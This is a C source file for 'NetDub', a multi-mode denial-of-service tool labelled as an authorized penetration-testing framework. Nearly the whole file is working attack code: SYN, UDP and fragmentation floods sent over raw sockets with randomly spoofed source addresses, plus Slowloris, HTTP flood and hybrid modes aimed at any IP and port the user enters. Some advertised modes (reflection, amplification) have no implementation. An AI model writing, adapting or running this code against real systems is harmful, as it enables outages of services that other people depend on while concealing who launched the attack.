/*
 * NetDub - Advanced DDoS Testing Framework
 * ⚠️ WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️
 * Requires: Linux, root privileges, libpcap-dev
 * Compile: gcc -o netdub netdub.c -lpcap -lpthread -lssl -lcrypto
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <ifaddrs.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <fcntl.h>

#define MAX_THREADS 1000
#define PACKET_SIZE 65536
#define PAYLOAD_SIZE 1024

// Global variables
char target_ip[16];
int target_port;
int attack_mode = 0;
int thread_count = 100;
int pps_target = 1000000;  // 1M packets per second
volatile int running = 1;
int raw_socket;

// Statistics
volatile long long packets_sent = 0;
volatile long long bytes_sent = 0;
volatile long long connections_made = 0;

// Attack modes
#define MODE_SYN_FLOOD     1
#define MODE_UDP_FLOOD     2
#define MODE_SLOWLORIS     3
#define MODE_HTTP_FLOOD    4
#define MODE_REFLECTION    5
#define MODE_FRAGMENTATION 6
#define MODE_AMPLIFICATION 7
#define MODE_LAYER7_ADAPTIVE 8
#define MODE_HYBRID        9

// Color codes
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define RESET   "\033[0m"

// Packet structures
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

// Random IP generation for spoofing
char* generate_random_ip() {
    static char ip[16];
    sprintf(ip, "%d.%d.%d.%d", 
            rand() % 255 + 1, 
            rand() % 255 + 1, 
            rand() % 255 + 1, 
            rand() % 255 + 1);
    return ip;
}

// Checksum calculation
unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// TCP checksum
unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct pseudo_header psh;
    char *pseudogram;
    int psize;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    pseudogram = malloc(psize);
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    unsigned short result = checksum((unsigned short*)pseudogram, psize);
    free(pseudogram);
    return result;
}

// High-performance SYN flood
void* syn_flood_thread(void* arg) {
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;
    int local_packets = 0;

    // Zero out the packet buffer
    memset(packet, 0, PACKET_SIZE);

    // Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->daddr = inet_addr(target_ip);

    // TCP Header
    tcph->dest = htons(target_port);
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    while (running) {
        // Randomize source IP for spoofing
        char* src_ip = generate_random_ip();
        iph->saddr = inet_addr(src_ip);
        tcph->source = htons(rand() % 65535);
        tcph->seq = random();
        
        // Calculate checksums
        iph->check = 0;
        iph->check = checksum((unsigned short*)packet, iph->tot_len);
        tcph->check = 0;
        tcph->check = tcp_checksum(iph, tcph);

        // Send packet
        if (sendto(raw_socket, packet, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0) {
            continue;
        }

        local_packets++;
        __sync_fetch_and_add(&packets_sent, 1);
        __sync_fetch_and_add(&bytes_sent, iph->tot_len);

        // Rate limiting
        if (local_packets % 1000 == 0) {
            usleep(1000);
        }
    }
    return NULL;
}

// UDP flood with amplification
void* udp_flood_thread(void* arg) {
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr*)packet;
    struct udphdr *udph = (struct udphdr*)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    int payload_size = 1024;

    // Fill payload with random data
    for (int i = 0; i < payload_size; i++) {
        payload[i] = rand() % 256;
    }

    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    iph->id = htonl(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->daddr = inet_addr(target_ip);

    // UDP Header
    udph->dest = htons(target_port);
    udph->len = htons(sizeof(struct udphdr) + payload_size);
    udph->check = 0;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    while (running) {
        char* src_ip = generate_random_ip();
        iph->saddr = inet_addr(src_ip);
        udph->source = htons(rand() % 65535);
        
        iph->check = 0;
        iph->check = checksum((unsigned short*)packet, iph->tot_len);

        if (sendto(raw_socket, packet, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0) {
            continue;
        }

        __sync_fetch_and_add(&packets_sent, 1);
        __sync_fetch_and_add(&bytes_sent, iph->tot_len);
    }
    return NULL;
}

// Slowloris attack
void* slowloris_thread(void* arg) {
    int sock;
    struct sockaddr_in server;
    char request[1024];
    char headers[][64] = {
        "X-a: %d\r\n",
        "X-b: %d\r\n", 
        "X-c: %d\r\n",
        "X-d: %d\r\n"
    };

    while (running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        server.sin_addr.s_addr = inet_addr(target_ip);
        server.sin_family = AF_INET;
        server.sin_port = htons(target_port);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            close(sock);
            continue;
        }

        // Send partial HTTP request
        snprintf(request, sizeof(request), 
                "GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n",
                rand(), target_ip);
        send(sock, request, strlen(request), 0);

        __sync_fetch_and_add(&connections_made, 1);

        // Keep connection alive with slow headers
        for (int i = 0; i < 100 && running; i++) {
            snprintf(request, sizeof(request), headers[rand() % 4], rand());
            send(sock, request, strlen(request), 0);
            sleep(10);
        }

        close(sock);
    }
    return NULL;
}

// HTTP flood
void* http_flood_thread(void* arg) {
    int sock;
    struct sockaddr_in server;
    char request[2048];
    char response[1024];

    while (running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        server.sin_addr.s_addr = inet_addr(target_ip);
        server.sin_family = AF_INET;
        server.sin_port = htons(target_port);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            close(sock);
            continue;
        }

        // Send HTTP requests rapidly
        for (int i = 0; i < 100 && running; i++) {
            snprintf(request, sizeof(request),
                    "GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: NetDub/1.0\r\n"
                    "Accept: */*\r\nConnection: keep-alive\r\n\r\n",
                    rand(), target_ip);
            
            send(sock, request, strlen(request), 0);
            recv(sock, response, sizeof(response), MSG_DONTWAIT);
            
            __sync_fetch_and_add(&packets_sent, 1);
            __sync_fetch_and_add(&bytes_sent, strlen(request));
        }

        close(sock);
    }
    return NULL;
}

// Fragmentation attack
void* fragmentation_thread(void* arg) {
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr*)packet;
    struct sockaddr_in sin;
    int fragment_size = 8;  // Small fragments

    while (running) {
        for (int offset = 0; offset < 1400; offset += fragment_size) {
            memset(packet, 0, PACKET_SIZE);
            
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof(struct iphdr) + fragment_size;
            iph->id = htonl(rand());
            iph->frag_off = htons(offset / 8);
            if (offset + fragment_size < 1400) {
                iph->frag_off |= htons(0x2000);  // More fragments
            }
            iph->ttl = 64;
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = inet_addr(generate_random_ip());
            iph->daddr = inet_addr(target_ip);

            iph->check = checksum((unsigned short*)packet, iph->tot_len);

            sin.sin_family = AF_INET;
            sin.sin_addr.s_addr = inet_addr(target_ip);

            sendto(raw_socket, packet, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));
            __sync_fetch_and_add(&packets_sent, 1);
        }
    }
    return NULL;
}

// Hybrid attack combining multiple methods
void* hybrid_attack_thread(void* arg) {
    int method = rand() % 4;
    
    switch (method) {
        case 0: return syn_flood_thread(arg);
        case 1: return udp_flood_thread(arg);
        case 2: return slowloris_thread(arg);
        case 3: return http_flood_thread(arg);
        default: return syn_flood_thread(arg);
    }
}

// Statistics thread
void* stats_thread(void* arg) {
    long long prev_packets = 0;
    long long prev_bytes = 0;
    time_t start_time = time(NULL);

    while (running) {
        sleep(1);
        
        long long curr_packets = packets_sent;
        long long curr_bytes = bytes_sent;
        long long pps = curr_packets - prev_packets;
        long long bps = curr_bytes - prev_bytes;
        
        printf("\r" CYAN "[NetDub] " RESET 
               "PPS: " YELLOW "%lld" RESET " | "
               "Total: " GREEN "%lld" RESET " packets | "
               "BPS: " MAGENTA "%.2f MB/s" RESET " | "
               "Connections: " BLUE "%lld" RESET " | "
               "Runtime: " WHITE "%ld" RESET "s",
               pps, curr_packets, (double)bps / 1024 / 1024, 
               connections_made, time(NULL) - start_time);
        fflush(stdout);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
    }
    return NULL;
}

// Signal handler
void signal_handler(int sig) {
    running = 0;
    printf("\n" RED "[!] Stopping attack..." RESET "\n");
}

// Setup raw socket with maximum performance
int setup_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Raw socket creation failed");
        return -1;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL failed");
        close(sock);
        return -1;
    }

    // Maximize socket buffer sizes
    int buffer_size = 1024 * 1024;  // 1MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));

    return sock;
}

// Optimize system for high performance
void optimize_system() {
    // Increase file descriptor limits
    struct rlimit rlim;
    rlim.rlim_cur = 999999;
    rlim.rlim_max = 999999;
    setrlimit(RLIMIT_NOFILE, &rlim);

    // Lock memory to prevent swapping
    mlockall(MCL_CURRENT | MCL_FUTURE);

    // Set high priority
    setpriority(PRIO_PROCESS, 0, -20);
}

void print_banner() {
    printf(RED "╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                          NetDub                             ║\n");
    printf("║                Advanced DDoS Testing Framework              ║\n");
    printf("║                     " YELLOW "⚠️  ROOT REQUIRED  ⚠️" RED "                     ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n" RESET);
    printf(YELLOW "⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY  ⚠️\n" RESET);
    printf(RED "⚠️  MISUSE MAY RESULT IN LEGAL CONSEQUENCES  ⚠️\n\n" RESET);
}

void print_menu() {
    printf(CYAN "Attack Modes:\n" RESET);
    printf("1. SYN Flood (High-speed packet flood)\n");
    printf("2. UDP Flood (Bandwidth saturation)\n");
    printf("3. Slowloris (Connection exhaustion)\n");
    printf("4. HTTP Flood (Application layer stress)\n");
    printf("5. Reflection Attack (Amplification)\n");
    printf("6. Fragmentation Attack (Resource exhaustion)\n");
    printf("7. Amplification Attack (DNS/NTP abuse)\n");
    printf("8. Layer 7 Adaptive (Smart application attack)\n");
    printf("9. Hybrid Attack (Combined methods)\n");
    printf("0. Exit\n\n");
}

int main() {
    // Check root privileges
    if (geteuid() != 0) {
        printf(RED "[!] This tool requires root privileges\n" RESET);
        printf(YELLOW "[*] Please run with: sudo ./netdub\n" RESET);
        return 1;
    }

    print_banner();
    
    // System optimization
    optimize_system();
    
    // Setup raw socket
    raw_socket = setup_raw_socket();
    if (raw_socket < 0) {
        return 1;
    }

    // Get target information
    printf(GREEN "Enter target IP/domain: " RESET);
    scanf("%s", target_ip);
    printf(GREEN "Enter target port: " RESET);
    scanf("%d", &target_port);
    
    print_menu();
    printf(GREEN "Select attack mode: " RESET);
    scanf("%d", &attack_mode);
    
    if (attack_mode == 0) {
        close(raw_socket);
        return 0;
    }
    
    printf(GREEN "Enter number of threads (1-%d): " RESET, MAX_THREADS);
    scanf("%d", &thread_count);
    
    if (thread_count > MAX_THREADS) {
        thread_count = MAX_THREADS;
    }

    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    printf("\n" CYAN "[*] Starting attack on %s:%d with %d threads\n" RESET, 
           target_ip, target_port, thread_count);
    printf(YELLOW "[*] Press Ctrl+C to stop\n\n" RESET);

    // Create threads
    pthread_t threads[MAX_THREADS];
    pthread_t stats_tid;
    
    // Start statistics thread
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    // Start attack threads
    for (int i = 0; i < thread_count; i++) {
        void* (*thread_func)(void*) = NULL;
        
        switch (attack_mode) {
            case MODE_SYN_FLOOD:
                thread_func = syn_flood_thread;
                break;
            case MODE_UDP_FLOOD:
                thread_func = udp_flood_thread;
                break;
            case MODE_SLOWLORIS:
                thread_func = slowloris_thread;
                break;
            case MODE_HTTP_FLOOD:
                thread_func = http_flood_thread;
                break;
            case MODE_FRAGMENTATION:
                thread_func = fragmentation_thread;
                break;
            case MODE_HYBRID:
                thread_func = hybrid_attack_thread;
                break;
            default:
                thread_func = syn_flood_thread;
        }
        
        pthread_create(&threads[i], NULL, thread_func, NULL);
        usleep(1000);  // Small delay between thread creation
    }
    
    // Wait for threads to complete
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(stats_tid, NULL);
    
    printf("\n" GREEN "[✓] Attack completed\n" RESET);
    printf(CYAN "[*] Final statistics:\n" RESET);
    printf("    Packets sent: %lld\n", packets_sent);
    printf("    Bytes sent: %lld\n", bytes_sent);
    printf("    Connections made: %lld\n", connections_made);
    
    close(raw_socket);
    return 0;
}
